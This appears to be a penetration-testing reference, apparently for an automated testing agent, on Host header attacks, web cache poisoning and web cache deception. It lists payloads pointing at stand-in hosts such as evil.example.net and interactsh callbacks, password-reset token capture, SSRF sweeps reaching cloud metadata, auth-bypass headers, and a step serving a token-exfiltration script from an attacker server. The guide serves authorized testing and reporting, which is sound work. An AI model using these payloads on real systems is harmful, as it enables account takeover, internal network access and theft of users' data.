# Host header attacks & web cache poisoning / deception

## 1. Host header attacks (CWE-644, WSTG-INPV)

Apps and intermediaries trust `Host` (and forwarding headers) for link generation,
routing, virtual-host selection, and access decisions. Test every state-changing and
cacheable endpoint.

### Mutation set (baseline-diff each one)

```
# bogus host
curl -sk https://example.com/ -H 'Host: evil.example.net' -o r1 -D h1

# duplicate Host (needs raw socket or curl's parser tolerance; prefer smuggle_probe raw mode)
Host: example.com
Host: evil.example.net

# absolute-URI with mismatched Host
GET https://example.com/ HTTP/1.1
Host: evil.example.net

# port / userinfo tricks
Host: example.com:443@evil.example.net
Host: example.com.evil.example.net
Host: evil.example.net:80#@example.com

# override headers (the big five + Forwarded)
X-Forwarded-Host: evil.example.net
X-Host: evil.example.net
X-Forwarded-Server: evil.example.net
X-HTTP-Host-Override: evil.example.net
X-Original-Host: evil.example.net
Forwarded: for=203.0.113.9;host=evil.example.net;proto=https

# line wrapping (some front-ends strip the Host they validate but forward the indented one)
Host: example.com
 Host: evil.example.net
```

Read the diff: changed absolute links in HTML/headers (`Location`, `Link`, canonical
tags, password-reset mail) = reflection; 403->200 flips = routing/auth behavior;
different backend fingerprint = virtual-host routing.

### Password-reset poisoning

1. Start OOB listener: `interactsh-client -json -o oob.json` -> note `<id>.oast.pro`.
2. Submit the password-reset form for a victim account you control, adding
   `X-Forwarded-Host: <id>.oast.pro` (then each other override header; then mangled
   `Host`).
3. Check the received mail (your test account) — if the reset URL's host is yours, the
   token leaks when a victim clicks. Even without mail access, a later DNS/HTTP hit in
   `oob.json` carrying `?token=` in the path is full proof.
4. Report: severity high, CWE-640/CWE-644, WSTG-ATHN; evidence = the poisoning request,
   the mailed/poisoned link, and the interactsh callback record.

### Routing-based SSRF

Reverse proxies that route on Host can be steered at internal targets:

```
GET / HTTP/1.1
Host: <id>.oast.pro          # confirm the proxy makes outbound requests
GET / HTTP/1.1
Host: 192.0.2.10             # then sweep internal space
Host: 192.0.2.10:8080
```

Sweep RFC1918/link-local with a wordlist in Intruder/ffuf (keep the connection HTTP/1.1,
`Connection: close`). Response differentials (status, size, timing) map the internal
network. `Host: 169.254.169.254` + cloud paths => metadata SSRF; hand off to the SSRF
skill with interactsh built-ins (`aws.oast.fun`).

### Auth bypass

`Host: localhost` or `Host: 127.0.0.1` on restricted routes (`/admin`, `/metrics`,
`/server-status`) — some origins gate "internal" features on the Host value.
Also try `X-Original-URL: /admin` and `X-Rewrite-URL: /admin` with a benign path in
the request line (front-end checks the line, back-end honors the override).

## 2. Web cache poisoning (unkeyed input -> cached payload)

### Ground rules

- **Cache buster on every probe**: unique `?cb=<rand>` (or an unkeyed-but-tolerated
  header like `Origin` on some caches) so you only poison entries nobody else requests
  — until the deliberate final poisoning.
- Identify cache behavior first: `X-Cache: hit/miss`, `Age`, `CF-Cache-Status`,
  `X-Varnish`. Two identical requests, second shows `hit`/`Age>0` => cached. Note the
  TTL from `Cache-Control: s-maxage/max-age`.

### Finding unkeyed inputs — Param Miner

Burp: right-click request -> Extensions -> Param Miner -> "Guess headers" (or
"Guess everything"; "Guess GET parameters" for fat-GET/parameter cloaking). Settings
that matter: enable "Add dynamic cachebuster" so Param Miner busts for you. Hits show
as "Secret input: header" issues with the response diff.

Manual shortlist when Burp is unavailable (loop with curl + buster, diff bodies):

```
X-Forwarded-Host, X-Forwarded-Scheme, X-Forwarded-Proto, X-Forwarded-Port,
X-Original-URL, X-Rewrite-URL, X-Host, Forwarded, X-Forwarded-Prefix, X-Amz-Server-Side
```

### Confirm unkeyed + exploitable

1. `GET /?cb=777 HTTP/1.1` + `X-Forwarded-Host: canary.example.net` -> response
   reflects `canary.example.net` (e.g. in `<script src=...>`): input is *reflected*.
2. Re-request `GET /?cb=777` **without** the header from a clean client. Reflection
   still present + `X-Cache: hit` => input is *unkeyed* => poisonable.
3. Weaponize: point the reflected host at a server you control hosting the referenced
   path (`/static/app.js` returning `alert(document.domain)` or a token-exfil script).
   Poison the real (unbusted) URL once, confirm with a clean fetch, screenshot, then
   re-poison with a benign value or let TTL expire.

### Other poisoning primitives

- `X-Forwarded-Scheme: http` / `X-Forwarded-Proto: http` => origin issues a 301 to
  https; cached => redirect loop DoS for the cached URL (and with `X-Forwarded-Host`,
  a cached redirect to your host).
- **Fat GET**: GET with a body `param=payload` where cache keys only the URL but the
  origin reads the body param.
- **Parameter cloaking**: `/?a=1;param=payload` (semicolon splitting differs between
  cache and origin), or `?param=benign&param=payload` (first-vs-last precedence).
- **Normalization**: path encodings (`/%2e%2e/`, `//`, `/.;/`) keyed one way, routed
  another.
- Unkeyed query entirely (`X-Cache: hit` across different `?q=`): poison via query.

### Web cache deception (private content cached publicly)

Victim-side path confusion: cache keys/rules decide cacheability by extension or path
suffix the origin ignores.

```
/account/settings/x.css
/account/settings;x.css
/account/settings%2fx.css
/account/settings/..%2fsettings/x.css
/account/settings?x.css
```

Test flow: as an authenticated user, fetch `/account/settings/x.css`; if it returns
the private page, re-fetch the same URL unauthenticated — a `hit` serving the private
content confirms deception. Exploitation against real victims = deliver the crafted
URL, then fetch the cached copy. Report with both exchanges (authed priming request,
unauthenticated retrieval) in evidence.

## Reporting map

| Issue | Severity | Classification |
|---|---|---|
| Password-reset poisoning | high | CWE-640, WSTG-ATHN-09 |
| Host-based routing SSRF | high | CWE-918, WSTG-INPV-19 |
| Host-based auth bypass | high | CWE-644, WSTG-ATHZ-02 |
| Cache poisoning (XSS/redirect payload) | high/critical | CWE-444 / WSTG-INPV |
| Cached-redirect / poisoning DoS | medium | CWE-444 |
| Web cache deception | high | CWE-525, WSTG-ATHZ |

All go through `findings.report` (scope `endpoint`, HTTP exchanges in evidence) per
`references/rupu.md`; every tested route gets `assets.mark` at depth `tested` or
`exploited`.
